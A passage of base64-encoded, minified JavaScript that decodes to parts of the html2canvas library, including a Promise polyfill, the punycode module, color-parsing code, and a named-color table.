T09e30udG9TdHJpbmcuY2FsbChwcm9jZXNzKT9zKCk6TT9jKCk6QT9oKCk6bCgpO3ZhciBMPW5ldyBFLE49bmV3IEU7Qy5wcm90b3R5cGUubz1mdW5jdGlvbih0KXtyZXR1cm4gTyh0KX0sQy5wcm90b3R5cGUucD1mdW5jdGlvbigpe3JldHVybiBFcnJvcigiQXJyYXkgTWV0aG9kcyBtdXN0IGJlIHByb3ZpZGVkIGFuIEFycmF5Iil9LEMucHJvdG90eXBlLmw9ZnVuY3Rpb24oKXt0aGlzLmI9QXJyYXkodGhpcy5sZW5ndGgpfSxDLnByb3RvdHlwZS5rPWZ1bmN0aW9uKCl7Zm9yKHZhciB0PXRoaXMubGVuZ3RoLGU9dGhpcy5jLG49dGhpcy5tLHI9MDt2b2lkIDA9PT1lLmEmJnQ+cjtyKyspdGhpcy5qKG5bcl0scil9LEMucHJvdG90eXBlLmo9ZnVuY3Rpb24odCxlKXt2YXIgbj10aGlzLm47Im9iamVjdCI9PXR5cGVvZiB0JiZudWxsIT09dD90LmNvbnN0cnVjdG9yPT09biYmdm9pZCAwIT09dC5hPyh0LmY9bnVsbCx0aGlzLmcodC5hLGUsdC5iKSk6dGhpcy5xKG4ucmVzb2x2ZSh0KSxlKToodGhpcy5kLS0sdGhpcy5iW2VdPXRoaXMuaCh0KSl9LEMucHJvdG90eXBlLmc9ZnVuY3Rpb24odCxlLG4pe3ZhciByPXRoaXMuYzt2b2lkIDA9PT1yLmEmJih0aGlzLmQtLSx0aGlzLmkmJjI9PT10P2IocixuKTp0aGlzLmJbZV09dGhpcy5oKG4pKSwwPT09dGhpcy5kJiZ2KHIsdGhpcy5iKX0sQy5wcm90b3R5cGUuaD1mdW5jdGlvbih0KXtyZXR1cm4gdH0sQy5wcm90b3R5cGUucT1mdW5jdGlvbih0LGUpe3ZhciBuPXRoaXM7dyh0LHZvaWQgMCxmdW5jdGlvbih0KXtuLmcoMSxlLHQpfSxmdW5jdGlvbih0KXtuLmcoMixlLHQpfSl9O3ZhciBEPTA7Uy5hbGw9ZnVuY3Rpb24odCxlKXtyZXR1cm4gbmV3IEModGhpcyx0LCEwLGUpLmN9LFMucmFjZT1mdW5jdGlvbih0LGUpe2Z1bmN0aW9uIG4odCl7bShvLHQpfWZ1bmN0aW9uIHIodCl7YihvLHQpfXZhciBvPW5ldyB0aGlzKGQsZSk7aWYoIU8odCkpcmV0dXJuIGIobyxuZXcgVHlwZUVycm9yKCJZb3UgbXVzdCBwYXNzIGFuIGFycmF5IHRvIHJhY2UuIikpLG87Zm9yKHZhciBpPXQubGVuZ3RoLGE9MDt2b2lkIDA9PT1vLmEmJmk+YTthKyspdyh0aGlzLnJlc29sdmUodFthXSksdm9pZCAwLG4scik7cmV0dXJuIG99LFMucmVzb2x2ZT1mdW5jdGlvbih0LGUpe2lmKHQmJiJvYmplY3QiPT10eXBlb2YgdCYmdC5jb25zdHJ1Y3Rvcj09PXRoaXMpcmV0dXJuIHQ7dmFyIG49bmV3IHRoaXMoZCxlKTtyZXR1cm4gbShuLHQpLG59LFMucmVqZWN0PWZ1bmN0aW9uKHQsZSl7dmFyIG49bmV3IHRoaXMoZCxlKTtyZXR1cm4gYihuLHQpLG59LFMucHJvdG90eXBlPXtjb25zdHJ1Y3RvcjpTLHRoZW46ZnVuY3Rpb24odCxlKXt2YXIgcj10aGlzLmE7aWYoMT09PXImJiF0fHwyPT09ciYmIWUpcmV0dXJuIHRoaXM7dmFyIG89bmV3IHRoaXMuY29uc3RydWN0b3IoZCksaT10aGlzLmI7aWYocil7dmFyIGE9YXJndW1lbnRzW3ItMV07bihmdW5jdGlvbigpe1QocixvLGEsaSl9KX1lbHNlIHcodGhpcyxvLHQsZSk7cmV0dXJuIG99LCJjYXRjaCI6ZnVuY3Rpb24odCl7cmV0dXJuIHRoaXMudGhlbihudWxsLHQpfX07dmFyIEI9e1Byb21pc2U6Uyxwb2x5ZmlsbDpmdW5jdGlvbigpe3ZhciBlO2U9aSE9PXI/cjppIT09dCYmdC5kb2N1bWVudD90OnNlbGYsIlByb21pc2UiaW4gZSYmInJlc29sdmUiaW4gZS5Qcm9taXNlJiYicmVqZWN0ImluIGUuUHJvbWlzZSYmImFsbCJpbiBlLlByb21pc2UmJiJyYWNlImluIGUuUHJvbWlzZSYmZnVuY3Rpb24oKXt2YXIgdDtyZXR1cm4gbmV3IGUuUHJvbWlzZShmdW5jdGlvbihlKXt0PWV9KSxhKHQpfSgpfHwoZS5Qcm9taXNlPVMpfX07ImZ1bmN0aW9uIj09dHlwZW9mIG8mJm8uYW1kP28oZnVuY3Rpb24oKXtyZXR1cm4gQn0pOiJ1bmRlZmluZWQiIT10eXBlb2YgbW9kdWxlJiZtb2R1bGUuZXhwb3J0cz9tb2R1bGUuZXhwb3J0cz1COmkhPT10aGlzJiYodGhpcy5FUzZQcm9taXNlPUIpfS5jYWxsKHQpLHQmJnQuRVM2UHJvbWlzZS5wb2x5ZmlsbCgpLGk9PT1lfHwiZnVuY3Rpb24iIT10eXBlb2YgT2JqZWN0LmNyZWF0ZXx8ImZ1bmN0aW9uIiE9dHlwZW9mIGUuY3JlYXRlRWxlbWVudCgiY2FudmFzIikuZ2V0Q29udGV4dClyZXR1cm4odHx8bW9kdWxlLmV4cG9ydHMpLmh0bWwyY2FudmFzPWZ1bmN0aW9uKCl7cmV0dXJuIFByb21pc2UucmVqZWN0KCJObyBjYW52YXMgc3VwcG9ydCIpfSxpOyFmdW5jdGlvbih0KXtmdW5jdGlvbiBlKHQpe3Rocm93IFJhbmdlRXJyb3IoTFt0XSl9ZnVuY3Rpb24gaSh0LGUpe2Zvcih2YXIgbj10Lmxlbmd0aCxyPVtdO24tLTspcltuXT1lKHRbbl0pO3JldHVybiByfWZ1bmN0aW9uIGEodCxlKXt2YXIgbj10LnNwbGl0KCJAIikscj0iIjtuLmxlbmd0aD4xJiYocj1uWzBdKyJAIix0PW5bMV0pO3ZhciBvPXQuc3BsaXQoUCksYT1pKG8sZSkuam9pbigiLiIpO3JldHVybiByK2F9ZnVuY3Rpb24gcyh0KXtmb3IodmFyIGUsbixyPVtdLG89MCxpPXQubGVuZ3RoO2k+bzspZT10LmNoYXJDb2RlQXQobysrKSw1NTI5Nj5lfHxlPjU2MzE5fHxvPj1pP3IucHVzaChlKToobj10LmNoYXJDb2RlQXQobysrKSw1NjMyMD09KDY0NTEyJm4pP3IucHVzaCgoKDEwMjMmZSk8PDEwKSsoMTAyMyZuKSs2NTUzNik6KHIucHVzaChlKSxvLS0pKTtyZXR1cm4gcn1mdW5jdGlvbiBjKHQpe3JldHVybiBpKHQsZnVuY3Rpb24odCl7dmFyIGU9IiI7cmV0dXJuIHQ+NjU1MzUmJih0LT02NTUzNixlKz1CKHQ+Pj4xMCYxMDIzfDU1Mjk2KSx0PTU2MzIwfDEwMjMmdCksZSs9Qih0KX0pLmpvaW4oIiIpfWZ1bmN0aW9uIGgodCl7cmV0dXJuIDEwPnQtNDg/dC0yMjoyNj50LTY1P3QtNjU6MjY+dC05Nz90LTk3OkV9ZnVuY3Rpb24gbCh0LGUpe3JldHVybiB0KzIyKzc1KigyNj50KS0oKDAhPWUpPDw1KX1mdW5jdGlvbiB1KHQsZSxuKXt2YXIgcj0wO2Zvcih0PW4/RCh0L1MpOnQ+PjEsdCs9RCh0L2UpO3Q+TiprPj4xO3IrPUUpdD1EKHQvTik7cmV0dXJuIEQocisoTisxKSp0Lyh0K0MpKX1mdW5jdGlvbiBkKHQpe3ZhciBuLHIsbyxpLGEscyxsLGQscCxmLGc9W10sbT10Lmxlbmd0aCx5PTAsdj1PLGI9STtmb3Iocj10Lmxhc3RJbmRleE9mKFIpLDA+ciYmKHI9MCksbz0wO3I+bzsrK28pdC5jaGFyQ29kZUF0KG8pPDEyOHx8ZSgibm90LWJhc2ljIiksZy5wdXNoKHQuY2hhckNvZGVBdChvKSk7Zm9yKGk9cj4wP3IrMTowO20+aTspe2ZvcihhPXkscz0xLGw9RTttPml8fGUoImludmFsaWQtaW5wdXQiKSxkPWgodC5jaGFyQ29kZUF0KGkrKykpLChkPj1FfHxkPkQoKHgteSkvcykpJiZlKCJvdmVyZmxvdyIpLHkrPWQqcyxwPWw+Yj9iK2s+bD9sLWI6azpULHA8PWQ7bCs9RSlmPUUtcCxzPkQoeC9mKSYmZSgib3ZlcmZsb3ciKSxzKj1mO249Zy5sZW5ndGgrMSxiPXUoeS1hLG4sMD09YSksRCh5L24pPngtdiYmZSgib3ZlcmZsb3ciKSx2Kz1EKHkvbikseSU9bixnLnNwbGljZSh5KyssMCx2KX1yZXR1cm4gYyhnKX1mdW5jdGlvbiBwKHQpe3ZhciBuLHIsbyxpLGEsYyxoLGQscCxmLGcsbSx5LHYsYix3PVtdO2Zvcih0PXModCksbT10Lmxlbmd0aCxuPU8scj0wLGE9SSxjPTA7bT5jOysrYylnPXRbY10sMTI4PmcmJncucHVzaChCKGcpKTtmb3Iobz1pPXcubGVuZ3RoLGkmJncucHVzaChSKTttPm87KXtmb3IoaD14LGM9MDttPmM7KytjKWc9dFtjXSxnPj1uJiZoPmcmJihoPWcpO2Zvcih5PW8rMSxoLW4+RCgoeC1yKS95KSYmZSgib3ZlcmZsb3ciKSxyKz0oaC1uKSp5LG49aCxjPTA7bT5jOysrYylpZihnPXRbY10sbj5nJiYrK3I+eCYmZSgib3ZlcmZsb3ciKSxnPT1uKXtmb3IoZD1yLHA9RTtmPXA+YT9hK2s+cD9wLWE6azpULGY8PWQ7cCs9RSliPWQtZix2PUUtZix3LnB1c2goQihsKGYrYiV2LDApKSksZD1EKGIvdik7dy5wdXNoKEIobChkLDApKSksYT11KHIseSxvPT1pKSxyPTAsKytvfSsrciwrK259cmV0dXJuIHcuam9pbigiIil9ZnVuY3Rpb24gZih0KXtyZXR1cm4gYSh0LGZ1bmN0aW9uKHQpe3JldHVybiBBLnRlc3QodCk/ZCh0LnNsaWNlKDQpLnRvTG93ZXJDYXNlKCkpOnR9KX1mdW5jdGlvbiBnKHQpe3JldHVybiBhKHQsZnVuY3Rpb24odCl7cmV0dXJuIE0udGVzdCh0KT8ieG4tLSIrcCh0KTp0fSl9dmFyIG09Im9iamVjdCI9PXR5cGVvZiBuJiZuJiYhbi5ub2RlVHlwZSYmbix5PSJvYmplY3QiPT10eXBlb2YgbW9kdWxlJiZtb2R1bGUmJiFtb2R1bGUubm9kZVR5cGUmJm1vZHVsZSx2PSJvYmplY3QiPT10eXBlb2YgciYmcjsodi5nbG9iYWw9PT12fHx2LndpbmRvdz09PXZ8fHYuc2VsZj09PXYpJiYodD12KTt2YXIgYix3LHg9MjE0NzQ4MzY0NyxFPTM2LFQ9MSxrPTI2LEM9MzgsUz03MDAsST03MixPPTEyOCxSPSItIixBPS9eeG4tLS8sTT0vW15ceDIwLVx4N0VdLyxQPS9bXHgyRVx1MzAwMlx1RkYwRVx1RkY2MV0vZyxMPXtvdmVyZmxvdzoiT3ZlcmZsb3c6IGlucHV0IG5lZWRzIHdpZGVyIGludGVnZXJzIHRvIHByb2Nlc3MiLCJub3QtYmFzaWMiOiJJbGxlZ2FsIGlucHV0ID49IDB4ODAgKG5vdCBhIGJhc2ljIGNvZGUgcG9pbnQpIiwiaW52YWxpZC1pbnB1dCI6IkludmFsaWQgaW5wdXQifSxOPUUtVCxEPU1hdGguZmxvb3IsQj1TdHJpbmcuZnJvbUNoYXJDb2RlO2lmKGI9e3ZlcnNpb246IjEuMy4xIix1Y3MyOntkZWNvZGU6cyxlbmNvZGU6Y30sZGVjb2RlOmQsZW5jb2RlOnAsdG9BU0NJSTpnLHRvVW5pY29kZTpmfSwiZnVuY3Rpb24iPT10eXBlb2YgbyYmIm9iamVjdCI9PXR5cGVvZiBvLmFtZCYmby5hbWQpbygicHVueWNvZGUiLGZ1bmN0aW9uKCl7cmV0dXJuIGJ9KTtlbHNlIGlmKG0mJnkpaWYobW9kdWxlLmV4cG9ydHM9PW0peS5leHBvcnRzPWI7ZWxzZSBmb3IodyBpbiBiKWIuaGFzT3duUHJvcGVydHkodykmJihtW3ddPWJbd10pO2Vsc2UgdC5wdW55Y29kZT1ifSh0aGlzKTt2YXIgWWU9ImRhdGEtaHRtbDJjYW52YXMtbm9kZSIsR2U9ImRhdGEtaHRtbDJjYW52YXMtY2FudmFzLWNsb25lIixRZT0wLCRlPTA7dC5odG1sMmNhbnZhcz1mdW5jdGlvbihuLHIpe3ZhciBvPSRlKys7aWYocj1yfHx7fSxyLmxvZ2dpbmcmJih0Lmh0bWwyY2FudmFzLmxvZ2dpbmc9ITAsdC5odG1sMmNhbnZhcy5zdGFydD1EYXRlLm5vdygpKSxyLmFzeW5jPWk9PT1yLmFzeW5jPyEwOnIuYXN5bmMsci5hbGxvd1RhaW50PWk9PT1yLmFsbG93VGFpbnQ/ITE6ci5hbGxvd1RhaW50LHIucmVtb3ZlQ29udGFpbmVyPWk9PT1yLnJlbW92ZUNvbnRhaW5lcj8hMDpyLnJlbW92ZUNvbnRhaW5lcixyLmphdmFzY3JpcHRFbmFibGVkPWk9PT1yLmphdmFzY3JpcHRFbmFibGVkPyExOnIuamF2YXNjcmlwdEVuYWJsZWQsci5pbWFnZVRpbWVvdXQ9aT09PXIuaW1hZ2VUaW1lb3V0PzFlNDpyLmltYWdlVGltZW91dCxyLnJlbmRlcmVyPSJmdW5jdGlvbiI9PXR5cGVvZiByLnJlbmRlcmVyP3IucmVuZGVyZXI6cWUsci5zdHJpY3Q9ISFyLnN0cmljdCwic3RyaW5nIj09dHlwZW9mIG4pe2lmKCJzdHJpbmciIT10eXBlb2Ygci5wcm94eSlyZXR1cm4gUHJvbWlzZS5yZWplY3QoIlByb3h5IG11c3QgYmUgdXNlZCB3aGVuIHJlbmRlcmluZyB1cmwiKTt2YXIgYz1udWxsIT1yLndpZHRoP3Iud2lkdGg6dC5pbm5lcldpZHRoLGg9bnVsbCE9ci5oZWlnaHQ/ci5oZWlnaHQ6dC5pbm5lckhlaWdodDtyZXR1cm4gdihrKG4pLHIucHJveHksZSxjLGgscikudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gcyh0LmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LHQscixjLGgpfSl9dmFyIGw9KG49PT1pP1tlLmRvY3VtZW50RWxlbWVudF06bi5sZW5ndGg/bjpbbl0pWzBdO3JldHVybiBsLnNldEF0dHJpYnV0ZShZZStvLG8pLGEobC5vd25lckRvY3VtZW50LHIsbC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3LmlubmVyV2lkdGgsbC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3LmlubmVySGVpZ2h0LG8pLnRoZW4oZnVuY3Rpb24odCl7cmV0dXJuImZ1bmN0aW9uIj09dHlwZW9mIHIub25yZW5kZXJlZCYmKE4oIm9wdGlvbnMub25yZW5kZXJlZCBpcyBkZXByZWNhdGVkLCBodG1sMmNhbnZhcyByZXR1cm5zIGEgUHJvbWlzZSBjb250YWluaW5nIHRoZSBjYW52YXMiKSxyLm9ucmVuZGVyZWQodCkpLHR9KX0sdC5odG1sMmNhbnZhcy5wdW55Y29kZT10aGlzLnB1bnljb2RlLHQuaHRtbDJjYW52YXMucHJveHk9e30sQy5wcm90b3R5cGUuZGFya2VuPWZ1bmN0aW9uKHQpe3ZhciBlPTEtdDtyZXR1cm4gbmV3IEMoW01hdGgucm91bmQodGhpcy5yKmUpLE1hdGgucm91bmQodGhpcy5nKmUpLE1hdGgucm91bmQodGhpcy5iKmUpLHRoaXMuYV0pfSxDLnByb3RvdHlwZS5pc1RyYW5zcGFyZW50PWZ1bmN0aW9uKCl7cmV0dXJuIDA9PT10aGlzLmF9LEMucHJvdG90eXBlLmlzQmxhY2s9ZnVuY3Rpb24oKXtyZXR1cm4gMD09PXRoaXMuciYmMD09PXRoaXMuZyYmMD09PXRoaXMuYn0sQy5wcm90b3R5cGUuZnJvbUFycmF5PWZ1bmN0aW9uKHQpe3JldHVybiBBcnJheS5pc0FycmF5KHQpJiYodGhpcy5yPU1hdGgubWluKHRbMF0sMjU1KSx0aGlzLmc9TWF0aC5taW4odFsxXSwyNTUpLHRoaXMuYj1NYXRoLm1pbih0WzJdLDI1NSksdC5sZW5ndGg+MyYmKHRoaXMuYT10WzNdKSksQXJyYXkuaXNBcnJheSh0KX07dmFyIEplPS9eIyhbYS1mMC05XXszfSkkL2k7Qy5wcm90b3R5cGUuaGV4Mz1mdW5jdGlvbih0KXt2YXIgZT1udWxsO3JldHVybiBudWxsIT09KGU9dC5tYXRjaChKZSkpJiYodGhpcy5yPXBhcnNlSW50KGVbMV1bMF0rZVsxXVswXSwxNiksdGhpcy5nPXBhcnNlSW50KGVbMV1bMV0rZVsxXVsxXSwxNiksdGhpcy5iPXBhcnNlSW50KGVbMV1bMl0rZVsxXVsyXSwxNikpLG51bGwhPT1lfTt2YXIgS2U9L14jKFthLWYwLTldezZ9KSQvaTtDLnByb3RvdHlwZS5oZXg2PWZ1bmN0aW9uKHQpe3ZhciBlPW51bGw7cmV0dXJuIG51bGwhPT0oZT10Lm1hdGNoKEtlKSkmJih0aGlzLnI9cGFyc2VJbnQoZVsxXS5zdWJzdHJpbmcoMCwyKSwxNiksdGhpcy5nPXBhcnNlSW50KGVbMV0uc3Vic3RyaW5nKDIsNCksMTYpLHRoaXMuYj1wYXJzZUludChlWzFdLnN1YnN0cmluZyg0LDYpLDE2KSksbnVsbCE9PWV9O3ZhciBaZT0vXnJnYlwoKFxkezEsM30pICosICooXGR7MSwzfSkgKiwgKihcZHsxLDN9KVwpJC87Qy5wcm90b3R5cGUucmdiPWZ1bmN0aW9uKHQpe3ZhciBlPW51bGw7cmV0dXJuIG51bGwhPT0oZT10Lm1hdGNoKFplKSkmJih0aGlzLnI9K2VbMV0sdGhpcy5nPStlWzJdLHRoaXMuYj0rZVszXSksbnVsbCE9PWV9O3ZhciB0bj0vXnJnYmFcKChcZHsxLDN9KSAqLCAqKFxkezEsM30pICosICooXGR7MSwzfSkgKiwgKihcZCtcLj9cZCopXCkkLztDLnByb3RvdHlwZS5yZ2JhPWZ1bmN0aW9uKHQpe3ZhciBlPW51bGw7cmV0dXJuIG51bGwhPT0oZT10Lm1hdGNoKHRuKSkmJih0aGlzLnI9K2VbMV0sdGhpcy5nPStlWzJdLHRoaXMuYj0rZVszXSx0aGlzLmE9K2VbNF0pLG51bGwhPT1lfSxDLnByb3RvdHlwZS50b1N0cmluZz1mdW5jdGlvbigpe3JldHVybiBudWxsIT09dGhpcy5hJiYxIT09dGhpcy5hPyJyZ2JhKCIrW3RoaXMucix0aGlzLmcsdGhpcy5iLHRoaXMuYV0uam9pbigiLCIpKyIpIjoicmdiKCIrW3RoaXMucix0aGlzLmcsdGhpcy5iXS5qb2luKCIsIikrIikifSxDLnByb3RvdHlwZS5uYW1lZENvbG9yPWZ1bmN0aW9uKHQpe3ZhciBlPWVuW3QudG9Mb3dlckNhc2UoKV07aWYoZSl0aGlzLnI9ZVswXSx0aGlzLmc9ZVsxXSx0aGlzLmI9ZVsyXTtlbHNlIGlmKCJ0cmFuc3BhcmVudCI9PT10LnRvTG93ZXJDYXNlKCkpcmV0dXJuIHRoaXMucj10aGlzLmc9dGhpcy5iPXRoaXMuYT0wLCEwO3JldHVybiEhZX0sQy5wcm90b3R5cGUuaXNDb2xvcj0hMDt2YXIgZW49e2FsaWNlYmx1ZTpbMjQwLDI0OCwyNTVdLGFudGlxdWV3aGl0ZTpbMjUwLDIzNSwyMTVdLGFxdWE6WzAsMjU1LDI1NV0sYXF1YW1hcmluZTpbMTI3LDI1NSwyMTJdLGF6dXJlOlsyNDAsMjU1LDI1NV0sYmVpZ2U6WzI0NSwyNDUsMjIwXSxiaXNxdWU6WzI1NSwyMjgsMTk2XSxibGFjazpbMCwwLDBdLGJsYW5jaGVkYWxtb25kOlsyNTUsMjM1LDIwNV0sYmx1ZTpbMCwwLDI1NV0sYmx1ZXZpb2xldDpbMTM4LDQzLDIyNl0sYnJvd246WzE2NSw0Miw0Ml0sYnVybHl3b29kOlsyMjIsMTg0LDEzNV0sY2FkZXRibHVlOls5NSwxNTgsMTYwXSxjaGFydHJldXNlOlsxMjcsMjU1LDBdLGNob2NvbGF0ZTpbMjEwLDEwNSwzMF0sY29yYWw6WzI1NSwxMjcsODBdLGNvcm5mbG93ZXJibHVlOlsxMDAsMTQ5LDIzN10sY29ybnNpbGs6WzI1NSwyNDgsMjIwXSxjcmltc29uOlsyMjAsMjAsNjBdLGN5YW46WzAsMjU1LDI1NV0sZGFya2JsdWU6WzAsMCwxMzldLGRhcmtjeWFuOlswLDEzOSwxMzldLGRhcmtnb2xkZW5yb2Q6WzE4NCwxMzQsMTFdLGRhcmtncmF5OlsxNjksMTY5LDE2OV0sZGFya2dyZWVuOlswLDEwMCwwXSxkYXJrZ3JleTpbMTY5LDE2OSwxNjldLGRhcmtraGFraTpbMTg5LDE4MywxMDddLGRhcmttYWdlbnRhOlsxMzksMCwxMzldLGRhcmtvbGl2ZWdyZWVuOls4NSwxMDcsNDddLGRhcmtvcmFuZ2U6WzI1NSwxNDAsMF0sZGFya29yY2hpZDpbMTUzLDUwLDIwNF0sZGFya3JlZDpbMTM5LDAsMF0sZGFya3NhbG1vbjpbMjMzLDE1MCwxMjJdLGRhcmtzZWFncmVlbjpbMTQzLDE4OCwxNDNdLGRhcmtzbGF0ZWJsdWU6WzcyLDYxLDEzOV0sZGFya3NsYXRlZ3JheTpbNDcsNzksNzldLGRhcmtzbGF0ZWdyZXk6WzQ3LDc5LDc5XSxkYXJrdHVycXVvaXNlOlswLDIwNiwyMDldLGRhcmt2aW9sZXQ6WzE0OCwwLDIxMV0sZGVlcHBpbms6WzI1NSwyMCwxNDddLGRlZXBza3libHVlOlswLDE5MSwyNTVdLGRpbWdyYXk6WzEwNSwxMDUsMTA1XSxkaW1ncmV5OlsxMDUsMTA1LDEwNV0sZG9kZ2VyYmx1ZTpbMzAsMTQ0LDI1NV0sZmlyZWJyaWNrOlsxNzgsMzQsMzRdLGZsb3JhbHdoaXRlOlsyNTUsMjUwLDI0MF0sZm9yZXN0Z3JlZW46WzM0LDEzOSwzNF0sZnVjaHNpYTpbMjU1LDAsMjU1XSxnYWluc2Jvcm86WzIyMCwyMjAsMjIwXSxnaG9zdHdoaXRlOlsyNDgsMjQ4LDI1NV0sZ29sZDpbMjU1LDIxNSwwXSxnb2xkZW5yb2Q6WzIxOCwxNjUsMzJdLGdyYXk6WzEyOCwxMjgsMTI4XSxncmVlbjpbMCwxMjgsMF0sZ3JlZW55ZWxsb3c6WzE3MywyNTUsNDddLGdyZXk6WzEyOCwxMjgsMTI4XSxob25leWRldzpbMjQwLDI1NSwyNDBdLGhvdHBpbms6WzI1NSwxMDUsMTgwXSxpbmRpYW5yZWQ6WzIwNSw5Miw5Ml0saW5kaWdvOls3NSwwLDEzMF0saXZvcnk6WzI1NSwyNTUsMjQwXSxraGFraTpbMjQwLDIzMCwxNDBdLGxhdmVuZGVyOlsyMzAsMjMwLDI1MF0sbGF2ZW5kZXJibHVzaDpbMjU1LDI0MCwyNDVdLGxhd25ncmVlbjpbMTI0LDI1MiwwXSxsZW1vbmNoaWZmb246WzI1NSwyNTAsMjA1XSxsaWdodGJsdWU6WzE3MywyMTYsMjMwXSxsaWdodGNvcmFsOlsyNDAsMTI4LDEyOF0sbGlnaHRjeWFuOlsyMjQsMjU1LDI1NV0sbGlnaHRnb2xkZW5yb2R5ZWxsb3c6WzI1MCwyNTAsMjEwXSxsaWdodGdyYXk6WzIxMSwyMTEsMjExXSxsaWdodGdyZWVuOlsxNDQsMjM4LDE0NF0sbGlnaHRncmV5OlsyMTEsMjExLDIxMV0sbGlnaHRwaW5rOlsyNTUsMTgyLDE5M10sbGlnaHRzYWxtb246WzI1NSwxNjAsMTIyXSxsaWdodHNlYWdyZWVuOlszMiwxNzgsMTcwXSxsaWdodHNreWJsdWU6WzEzNSwyMDYsMjUwXSxsaWdodHNsYXRlZ3JheTpbMTE5LDEzNiwxNTNdLGxpZ2h0c2xhdGVncmV5OlsxMTksMTM2LDE1M10sbGlnaHRzdGVlbGJsdWU6WzE3NiwxOTYsMjIyXSxsaWdodHllbGxvdzpbMjU1LDI1NSwyMjRdLGxpbWU6WzAsMjU1LDBdLGxpbWVncmVlbjpbNTAsMjA1LDUwXSxsaW5lbjpbMjUwLDI0MCwyMzBdLG1hZ2VudGE6WzI1NSwwLDI1NV0sbWFyb29uOlsxMjgsMCwwXSxtZWRpdW1hcXVhbWFyaW5lOlsxMDIsMjA1LDE3MF0sbWVkaXVtYmx1ZTpbMCwwLDIwNV0sbWVkaXVtb3JjaGlkOlsxODYsODUsMjExXSxtZWRpdW1wdXJwbGU6WzE0NywxMTIsMjE5XSxtZWRpdW1zZWFncmVlbjpbNjAsMTc5LDExM10sbWVkaXVtc2xhdGVibHVlOlsxMjMsMTA0LDIzOF0sbWVkaXVtc3ByaW5nZ3JlZW46WzAsMjUwLDE1NF0sbWVkaXVtdHVycXVvaXNlOls3MiwyMDksMjA0XSxtZWRpdW12aW9sZXRyZWQ6WzE5OSwyMSwxMzNdLG1pZG5pZ2h0Ymx1ZTpbMjUsMjUsMTEyXSxtaW50Y3JlYW06WzI0NSwyNTUsMjUwXSxtaXN0eXJvc2U6WzI1NSwyMjgsMjI1XSxtb2NjYXNpbjpbMjU1LDIyOCwxODFdLG5hdmFqb3doaXRlOlsyNTUsMjIyLDE3M10sbmF2eTpbMCwwLDEyOF0sb2xkbGFjZTpbMjUzLDI0NSwyMzBdLG9saXZlOlsxMjgsMTI4LDBdLG9saXZlZHJhYjpbMTA3LDE0MiwzNV0sb3JhbmdlOlsyNTUsMTY1LDBdLG9yYW5nZXJlZDpbMjU1LDY5LDBdLG9yY2hpZDpbMjE4LDExMiwyMTRdLHBhbGVnb2xkZW5yb2Q6WzIzOCwyMzIsMTcwXSxwYWxlZ3JlZW46WzE1MiwyNTEsMTUyXSxwYWxldHVycXVvaXNlOlsxNzUsMjM4LDIzOF0scGFsZXZpb2xldHJlZDpbMjE5LDExMiwxNDddLHBhcGF5YXdoaXA6WzI1NSwyMzksMjEzXSxwZWFjaHB1ZmY6WzI1NSwyMTgsMTg1XSxwZXJ1OlsyMDUsMTMzLDYzXSxwaW5rOlsyNTUsMTkyLDIwM10scGx1bTpbMjIxLDE2MCwyMjFdLHBvd2RlcmJsdWU6WzE3NiwyMjQsMjMwXSxwdXJwbGU6WzEyOCwwLDEyOF0scmViZWNjYXB1cnBsZTpbMTAyLDUxLDE1M10scmVkOlsyNTUsMCwwXSxyb3N5YnJvd246WzE4OCwxNDMsMTQzXSxyb3lhbGJsdWU6WzY1LDEwNSwyMjVdLHNhZGRsZWJyb3duOlsxMzksNjksMTldLHNhbG1vbjpbMjUwLDEyOCwxMTRdLHNhbmR5YnJvd246WzI0NCwxNjQsOTZdLHNlYWdyZWVuOls0NiwxMzksODddLHNlYXNoZWxsOlsyNTUsMjQ1LDIzOF0sc2llbm5hOlsxNjAsODIsNDVdLHNpbHZlcjpbMTkyLDE5MiwxOTJdLHNreWJsdWU6WzEzNSwyMDYsMjM1XSxzbGF0ZWJsdWU6WzEwNiw5MCwyMDVdLHNsYXRlZ3JheTpbMTEyLDEyOCwxNDRdLHNsYXRlZ3JleTpbMTEyLDEyOCwxNDRdLHNub3c6WzI1NSwyNTAsMjUwXSxzcHJpbmdncmVlbjpbMCwyNTUsMTI3XSxzdGVlbGJsdWU6WzcwLDEzMCwxODBdLHRhbjpbMjEwLDE4MCwxNDBdLHRlYWw6WzAsMTI4LDEyOF0sdGhpc3RsZTpbMjE2LDE5MSwyMTZdLHRvbWF0bzpbMjU1LDk5LDcxXSx0dXJxdW9pc2U6WzY0LDIyNCwyMDhdLHZpb2xldDpbMjM4LDEzMCwyMzhdLHdoZWF0OlsyNDUsMjIyLDE3OV0sd2hpdGU6WzI1NSwyNTUsMjU1XSx3aGl0ZXNtb2tlOlsyNDUsMjQ1LDI0NV0seWVsbG93OlsyNTUsMjU1LDBdLHllbGxvd2dyZWVuOlsxNTQsMjA1LDUwXX07Ty5wcm90b3R5cGUuZ2V0TWV0cmljcz1mdW5jdGlvbih0LGUpe3JldHVybiB0aGlzLmRhdGFbdCsiLSIrZV09PT1pJiYodGhpcy5kYXRhW3QrIi0iK2VdPW5ldyBJKHQsZSkpLHRoaXMuZGF0YVt0KyItIitlXX0sUi5wcm90b3R5cGUucHJveHlMb2FkPWZ1bmN0aW9uKHQsZSxuKXt2YXIgcj10aGlzLnNyYztyZXR1cm4gdihyLnNyYyx0LHIub3duZXJEb2N1bWVudCxlLndpZHRoLGUuaGVpZ2h0LG4pfSxBLnByb3RvdHlwZS5UWVBFUz17TElORUFSOjEsUkFESUFMOjJ9LFAucHJvdG90eXBlLmZpbmRJbWFnZXM9ZnVuY3Rpb24odCl7dmFyIGU9W107cmV0dXJuIHQucmVkdWNlKGZ1bmN0aW9uKHQsZSl7c3dpdGNoKGUubm9kZS5ub2RlTmFtZSl7Y2FzZSJJTUciOnJldHVybiB0LmNvbmNhdChbe2FyZ3M6W2Uubm9kZS5zcmNdLG1ldGhvZDoidXJsIn1dKTtjYXNlInN2ZyI6Y2FzZSJJRlJBTUUiOnJldHVybiB0LmNvbmNhdChbe2FyZ3M6W2Uubm9kZV0sbWV0aG9kOmUubm9kZS5ub2RlTmFtZX1dKX1yZXR1cm4gdH0sW10pLmZvckVhY2godGhpcy5hZGRJbWFnZShlLHRoaXMubG9hZEltYWdlKSx0aGlzKSxlfSxQLnByb3RvdHlwZS5maW5kQmFja2dyb3VuZEltYWdlPWZ1bmN0aW9uKHQsZSl7cmV0dXJuIGUucGFyc